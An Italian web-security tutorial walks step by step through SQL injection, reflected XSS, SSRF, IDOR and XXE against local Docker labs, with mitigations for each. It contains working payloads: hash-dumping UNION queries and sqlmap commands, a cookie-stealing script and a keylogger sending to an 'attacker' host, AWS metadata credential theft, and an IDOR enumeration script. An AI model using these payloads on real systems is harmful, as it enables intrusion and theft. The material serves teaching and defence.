---
title: "Walkthrough byte-per-byte: SQLi, XSS, SSRF, IDOR"
area: "Web"
order: 10.5
level: "intermedio"
summary: "Quattro attacchi reali eseguiti passo-passo con request/response complete, ogni carattere spiegato. Tutto in ambiente locale legale. Da 'capisco a parole' a 'capisco con mano sui tasti'."
prereq:
  - "Sezione 04, 10"
tools:
  - "Burp Suite Community o curl + jq"
  - "DVWA / Juice Shop / WebGoat in Docker"
  - "Browser DevTools"
---

# Walkthrough byte-per-byte

> Ogni esempio in questa sezione è eseguibile sul tuo lab Docker (DVWA / Juice Shop). Esegui ogni request, leggi ogni byte. Niente "trust the tool".

## Setup veloce

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# Apri http://localhost  user: admin  pass: password
# Setup database (clicca "Create / Reset Database")
# DVWA Security: Low (per partire)
```

## 1. SQL Injection — il primo, l'archetipo

### La pagina vulnerabile

URL: `http://localhost/vulnerabilities/sqli/`

Form: campo "User ID", submit. Sotto, c'è codice (in modalità "view source"):

```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**Vulnerabilità ovvia**: `$id` concatenato direttamente in SQL. Niente escape, niente prepared statement.

### Step 1 — input innocuo, capisco la baseline

Request HTTP che il browser fa:
```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc...; security=low
```

Response (interessante):
```html
<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>
```

**Query effettiva** lato server:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

Restituisce 1 riga: admin/admin.

### Step 2 — testa l'iniezione

Cosa succede se metti `1'`? La query diventa:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'';
                                                          ^^ apice spaiato
```

Errore SQL. Conferma vulnerability:
```http
GET /vulnerabilities/sqli/?id=1'&Submit=Submit
```

Response:
```
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''1''' at line 1
```

**Errore SQL leak nella response = injection confermata + "error-based" possibile.**

### Step 3 — bypass logico (ottieni tutto)

Payload: `1' OR '1'='1`. Query diventa:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Condizione `user_id = '1'` (vera per Admin) OR `'1'='1'` (sempre vera) → **WHERE è sempre vero** → ritorna **tutti gli utenti**.

```http
GET /vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit
```

Lo spazio è URL-encodato come `+`. Anche `%20` va bene.

Response:
```
ID: 1' OR '1'='1
First name: admin   Surname: admin
First name: Gordon  Surname: Brown
First name: Hack    Surname: Me
First name: Pablo   Surname: Picasso
First name: Bob     Surname: Smith
```

5 utenti. **Bypass authentication-equivalent**.

### Step 4 — UNION-based per estrarre dati arbitrari

Per usare `UNION SELECT`, devo sapere **quanti campi** ha la query originale. Test con `ORDER BY`:

```
?id=1' ORDER BY 1-- -
?id=1' ORDER BY 2-- -
?id=1' ORDER BY 3-- -
```

Il commento `-- ` (con spazio finale!) elimina il resto della query originale. La terza dà errore `Unknown column '3'`. Quindi **2 colonne**.

Adesso UNION per estrarre la versione del DB:
```
?id=1' UNION SELECT 1, version()-- -
```

Query:
```sql
SELECT first_name, last_name FROM users WHERE user_id='1' UNION SELECT 1, version()-- -';
```

Response:
```
ID: 1' UNION SELECT 1, version()-- 
First name: admin
Surname: admin
First name: 1
Surname: 10.1.26-MariaDB-0+deb9u1
```

**Hai la versione del DB.** Ora sa che è MariaDB 10.1 → docs per syntax specifico.

### Step 5 — leggi `information_schema` (la mappa del database)

In MySQL/MariaDB c'è una tabella di sistema `information_schema.tables` che lista tutto.

```
?id=1' UNION SELECT 1, group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()-- -
```

Decostruito:
- `UNION SELECT 1, X` → due colonne (compatibili con SELECT originale).
- `group_concat(table_name SEPARATOR ',')` → concatena nomi tabelle in unica stringa.
- `FROM information_schema.tables` → metadata.
- `WHERE table_schema=database()` → solo il DB corrente.
- `-- ` → commento (chiude il resto).

Response (estratto):
```
Surname: guestbook,users
```

C'è la tabella `users`.

### Step 6 — estrai colonne di `users`

```
?id=1' UNION SELECT 1, group_concat(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
```

Response:
```
Surname: user_id,first_name,last_name,user,password,avatar,...
```

### Step 7 — estrai username e password hash

```
?id=1' UNION SELECT user, password FROM users-- -
```

Response:
```
First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb     Surname: e99a18c428cb38d5f260853678922e03
First name: 1337        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo       Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Hash MD5! Crack online o offline:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > h.txt
hashcat -m 0 h.txt rockyou.txt
# → password
```

**Game over.** Username admin / password "password".

### Step 8 — automatizza con sqlmap

Tutto lo step 1-7 manuale è didattico. In production usi `sqlmap`:
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc; security=low" --batch --dbs

sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

In ~10 secondi avresti i hash. Ma **se non sapessi il manuale, useresti sqlmap come scatola nera e non capiresti i bypass quando WAF si mette in mezzo.**

### Mitigazione (forma corretta)

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

Parametri **separati** dalla query → input utente non può alterare struttura SQL.

## 2. XSS reflected — esecuzione codice nel browser vittima

### Pagina vulnerabile

URL: `http://localhost/vulnerabilities/xss_r/?name=test`

Source PHP:
```php
$html = "<pre>Hello " . $_GET['name'] . "</pre>";
echo $html;
```

Input riflesso senza HTML escape. Test:

```
?name=<script>alert(1)</script>
```

Response HTML:
```html
<pre>Hello <script>alert(1)</script></pre>
```

Browser parse, esegue → popup `1`. **XSS confermata.**

### Step 2 — payload utili (non innocui)

Cookie steal:
```html
<script>fetch('http://attacker/?c='+encodeURIComponent(document.cookie))</script>
```

In URL:
```
?name=%3Cscript%3Efetch('http://attacker/?c='%2BencodeURIComponent(document.cookie))%3C/script%3E
```

**Mandi questo link alla vittima**. Se clicca → suo browser fetcha attacker passando i cookie. Tu li leggi nei tuoi access.log e usi per session hijack.

### Step 3 — bypass filtro debole

Se developer aggiunge filtro naive:
```php
$name = str_replace('<script>', '', $_GET['name']);
```

Bypass:
- Doppio tag: `<scr<script>ipt>alert(1)</script>` → filtra inner, rimane outer.
- Case mix: `<ScRiPt>` (PHP non-case-sensitive html, ma alcuni filtri sono case-sensitive).
- Event handler: `<img src=x onerror=alert(1)>` — non c'è "script" come stringa.
- SVG: `<svg onload=alert(1)>`.
- Body: `<body onpageshow=alert(1)>`.
- Iframe srcdoc: `<iframe srcdoc="<script>alert(1)</script>">`.
- JS protocol: `<a href="javascript:alert(1)">click</a>`.
- DOM clobbering, mutation XSS, ... 

Repertorio: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Step 4 — payload più realistico (keylogger)

```html
<script>
const k=[]; 
document.addEventListener('keydown', e => {
    k.push(e.key);
    if (k.length > 50) {
        fetch('http://attacker/?l=' + encodeURIComponent(k.join('')));
        k.length = 0;
    }
});
</script>
```

Su pagina con form di login → catturi pass mentre digita.

### Mitigation (in ordine di robustezza)

1. **Context-aware encoding**: HTML body, attribute, JS string, URL — encoding diverso. Usa template engine sicuro (Jinja2 autoescape, React JSX).
2. **CSP** strict (no `unsafe-inline`, nonces o hash-based, no `unsafe-eval`).
3. **HttpOnly** cookie (no JS access → niente furto via XSS-document.cookie).
4. **Sanitization HTML utente**: DOMPurify se proprio devi accettare HTML.

## 3. SSRF — il server fa request che tu controlli

### Setup didattico

Lab: WebGoat o Juice Shop. Endpoint che fetcha un URL:
```python
@app.get('/preview')
def preview(url):
    r = requests.get(url, timeout=5)
    return r.text
```

Test naïve:
```
GET /preview?url=https://example.com
```

Response: contenuto example.com. ✅ funziona come previsto.

### Step 1 — SSRF di base, scansiona rete interna

```
?url=http://127.0.0.1:22
```

Se server (containerizzato o EC2) ha SSH locale, ottieni il banner:
```
SSH-2.0-OpenSSH_8.4p1 Debian...
```

**Hai accesso (via SSRF) ai servizi privati.**

Enumera porte interne:
```bash
for p in 22 80 443 3306 5432 6379 8080 8443 27017; do
    curl -s "http://target/preview?url=http://127.0.0.1:$p" | head -1
done
```

### Step 2 — leggi AWS metadata (IMDSv1)

Su EC2 con IMDSv1 attivo:
```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: `my-app-role`.

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role
```

Response (JSON):
```json
{
  "Code": "Success",
  "LastUpdated": "2026-05-21T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLE...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
  "Token": "FwoGZXIvYXdzEK//...",
  "Expiration": "2026-05-21T16:00:00Z"
}
```

Usa con AWS CLI:
```bash
export AWS_ACCESS_KEY_ID=ASIAEXAMPLE...
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7...
export AWS_SESSION_TOKEN=FwoGZXIvYXdz...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name my-app-role
```

Da qui exfil bucket, lambda, ecc. **Catastrofico.**

### Step 3 — bypass filtri debole

Server tenta di filtrare loopback:
```python
if 'localhost' in url or '127.0.0.1' in url:
    return "blocked"
```

Bypass:
- `http://127.1` (forma corta valida).
- `http://0.0.0.0`.
- `http://[::1]/` (IPv6 loopback).
- `http://2130706433/` (127.0.0.1 in decimale).
- `http://0x7f000001/` (hex).
- `http://017700000001/` (octal).
- `http://127.0.0.1.nip.io/` (DNS service che risolve a 127.0.0.1).
- DNS rebinding: dominio che risolve prima a IP innocuo, poi (dopo check) a 127.0.0.1.

### Step 4 — protocol smuggling

Se la libreria HTTP supporta più schemi:
- `file:///etc/passwd` — LFI da SSRF.
- `gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A` — exploit Redis senza auth via SSRF (corruptione comandi RESP).
- `dict://`, `ldap://`.

### Mitigation

- **Whitelist** di domini permessi.
- Risolvi DNS lato server, controlla IP risultato vs RFC1918/loopback/link-local, **rifiuta**, poi connetti con IP fisso.
- Network: nginx/HAProxy davanti, blocca 169.254.0.0/16.
- **IMDSv2** (richiede PUT + token).
- Disable schemi pericolosi (`gopher`, `file`, `dict`).

## 4. IDOR — il bug più boring e più presente

### Lab

Webapp finta con `/api/orders/{id}` che restituisce ordine se appartiene a utente loggato. Spoiler: il check authorization manca.

### Step 1 — capisci pattern

Login come Alice. Vai sui tuoi ordini. URL:
```
GET /api/orders/1042  →  {"id":1042,"user":"alice","items":[...]}
GET /api/orders/1043  →  {"id":1043,"user":"alice","items":[...]}
```

### Step 2 — incrementa

```
GET /api/orders/1041  →  {"id":1041,"user":"bob","items":[...]}
GET /api/orders/1040  →  {"id":1040,"user":"alice","items":[...]}
```

**Vedi gli ordini di Bob.** Niente check authorization sull'oggetto.

### Step 3 — automatizza enum

```python
import requests
s = requests.Session()
s.post("https://target/login", json={"user":"alice","pass":"..."})

leaked = []
for i in range(1, 10000):
    r = s.get(f"https://target/api/orders/{i}")
    if r.status_code == 200:
        data = r.json()
        if data['user'] != 'alice':
            leaked.append(data)

print(f"Leaked {len(leaked)} orders of other users")
```

In 10 minuti **10k record di privacy violation**.

### Step 4 — varianti

- **BFLA** (Broken Function Level Authz): utente normale chiama endpoint admin. `GET /api/admin/users` → invece di 403 funziona.
- **Parameter pollution**: `?user_id=alice&user_id=bob` (servono i secondi).
- **Mass assignment**: PATCH ordine con campo `user_id` → ti regali ordine altrui.
- **GUID guessable**: GUID v1 contengono MAC + timestamp → indovinabili.

### Mitigation

```python
@app.get('/api/orders/<int:id>')
@login_required
def get_order(id):
    order = Order.query.get_or_404(id)
    if order.user_id != current_user.id and not current_user.is_admin:
        abort(403)
    return order.to_json()
```

**Always-on authorization check per oggetto**. Pattern: gateway/middleware che applica policy → niente "mi sono dimenticato".

## 5. Bonus — XXE in 10 secondi

Server che parse XML:
```xml
<?xml version="1.0"?>
<user><name>Alice</name></user>
```

Aggiungi DTD esterna:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<user><name>&x;</name></user>
```

Se parser permissivo → `<name>` espande `&x;` con contenuto di `/etc/passwd`. **LFI via XML.**

Mitigation: `defusedxml` in Python o disabilitare DTD nel parser.

## Concetti chiave

1. **SQLi**: capisci la query interna, manipola la sintassi, leggi error → leak. Mitigation: prepared statements.
2. **XSS**: input nel HTML/JS context, esegue nel browser vittima. Mitigation: encoding contestuale + CSP + HttpOnly.
3. **SSRF**: server fetcha URL tuo, hai accesso a interno + metadata cloud. Mitigation: whitelist + IMDSv2.
4. **IDOR**: nessun check authorization per oggetto. Mitigation: middleware authz sempre.

Adesso quando il SIEM ti darà alert "SQL injection attempt", non ti sembrerà più astratto — saprai esattamente la sequenza di byte che lo ha generato.
